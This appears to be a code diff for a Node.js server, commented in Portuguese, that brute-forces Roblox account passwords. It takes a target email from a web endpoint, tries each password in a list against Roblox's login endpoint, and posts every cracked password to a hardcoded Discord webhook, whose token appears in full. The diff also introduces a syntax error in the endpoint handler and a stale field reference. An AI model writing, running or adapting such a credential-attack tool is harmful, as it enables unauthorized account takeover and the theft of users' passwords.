@@ -2,50 +2,34 @@ const express = require('express');
 const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
-const { Client, GatewayIntentBits } = require('discord.js');
 
 const app = express();
 const port = process.env.PORT || 3000;
 
-// CONFIGURAÇÕES DO BOT
-const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
-const CHANNEL_ID = process.env.CHANNEL_ID;
-
-if (!DISCORD_TOKEN || !CHANNEL_ID) {
-    console.error("Falta DISCORD_TOKEN ou CHANNEL_ID nas Variáveis de Ambiente do Render!");
-}
-
-// Inicializar o Bot
-const client = new Client({ intents: [GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
-
-let isBotReady = false;
-
-client.on('ready', () => {
-    console.log(`✅ Bot conectado como ${client.user.tag}!`);
-    isBotReady = true;
-});
-
-client.login(DISCORD_TOKEN);
+// URL DO WEBHOOK DO DISCORD (Ja colocada conforme o pedido)
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";
 
 app.use(express.json());
 app.use(express.static('.'));
 
-// Função para enviar mensagem no Discord
+// Função para enviar mensagem no Discord via Webhook
 async function sendDiscordMessage(content) {
-    if (!isBotReady) return;
     try {
-        const channel = await client.channels.fetch(CHANNEL_ID);
-        if (channel) {
-            await channel.send(content);
-        }
+        await axios.post(WEBHOOK_URL, {
+            content: content,
+            username: "Roblox Brute Forcer",
+            avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg'
+        });
+        console.log("✅ Mensagem enviada ao Discord!");
     } catch (e) {
-        console.error("Erro ao enviar mensagem:", e.message);
+        console.error("❌ Erro ao enviar msg no Discord:", e.message);
     }
 }
 
 // Função para tentar Login no Roblox
-async function tryLogin(email, password) {
+async function tryRobloxLogin(email, password) {
     const baseUrl = "https://www.roblox.com";
+    
     const robloxClient = axios.create({
         baseURL: baseUrl,
         timeout: 8000,
@@ -57,10 +41,10 @@ async function tryLogin(email, password) {
     });
 
     try {
-        // 1. Pegar Cookies
+        // 1. Pegar Cookies iniciais
         await robloxClient.get('/');
         
-        // 2. Tentar Login
+        // 2. Tentar fazer Login
         const response = await robloxClient.post('/users/login', {
             username: email,
             password: password
@@ -70,18 +54,31 @@ async function tryLogin(email, password) {
         });
 
         const data = response.data;
-        
-        // Se der erro "User with that email/password not found", pode ser email ou senha errada.
-        // Se der erro "Password is incorrect", o email existe mas a senha está errada.
+
+        // Se houver um ID numérico, o login foi um SUCESSO
         if (data.id && typeof data.id === 'number') {
-            return { success: true, username: data.username, id: data.id, error: "Sucesso" };
+            return {
+                success: true,
+                username: data.username,
+                userId: data.id,
+                error: "Sucesso"
+            };
+        } else {
+            return {
+                success: false,
+                username: email,
+                userId: null,
+                error: data.error || "Erro Desconhecido"
+            };
         }
-        
-        // Retornar o erro para saber se foi senha ou email
-        return { success: false, username: email, id: null, error: data.error || "Erro Desconhecido" };
 
     } catch (error) {
-        return { success: false, username: email, id: null, error: error.message };
+        return {
+            success: false,
+            username: email,
+            userId: null,
+            error: error.message || "Timeout/Conexão"
+        };
     }
 }
 
@@ -104,45 +101,38 @@ async function startBruteForce(email) {
     }
 
     console.log(`Iniciando ataque em: ${email} com ${passwords.length} senhas...`);
-    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Email:** ${email}\n**Total de Senhas:** ${passwords.length}\n*O Bot vai testar agora...*`);
+    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}\n*O Bot vai testar agora...*`);
 
     let found = false;
 
     // 2. Testar cada senha
     for (const password of passwords) {
-        if (found) break; // Se já encontrou, parar
+        if (found) break;
 
-        const result = await tryLogin(email, password);
+        const result = await tryRobloxLogin(email, password);
 
         if (result.success) {
             found = true;
             const msg = `**✅ CONTA ENCONTRADA!**\n**Email:** ${email}\n**Senha Correta:** ${password}\n**Username:** ${result.username}\n**ID:** ${result.id}`;
             await sendDiscordMessage(msg);
             console.log("Encontrada:", password);
-        } else {
-            // Opcional: Ver se o erro diz que a senha está errada (significa que o email existe)
-            if (result.error && result.error.toLowerCase().includes('password')) {
-                console.log(`Senha errada: ${password}`);
-            }
         }
 
-        // 3. Pausa para não bloquear o Email no Roblox (Rate Limit)
-        // 1.5 segundos entre cada tentativa
+        // Pausa para não bloquear o Email no Roblox (Rate Limit)
         await new Promise(r => setTimeout(r, 1500));
     }
 
     if (!found) {
-        await sendDiscordMessage(`**❌ ATAQUE FINALIZADO (Sem Sucesso)**\n**Email:** ${email}\n**Senhas Testadas:** ${passwords.length}\n*Nenhuma senha da lista funcionou.*`);
+        await sendDiscordMessage(`**❌ ATAQUE FINALIZADO (Sem Sucesso)**\n**Alvo:** ${email}\n**Senhas Testadas:** ${passwords.length}\n*Nenhuma senha da lista funcionou.*`);
     }
 }
 
 // ENDPOINT: Receber o Email do Site e Iniciar o Ataque
-app.post('/start-brute-force', async (req, res) => {
+app.post('/start-brute-force', async (req, res) {
     const { email } = req.body;
 
     if (!email || !email.includes('@')) {
         return res.json({ success: false, error: "Email inválido" });
-
     }
 
     // Iniciar o ataque em "background"
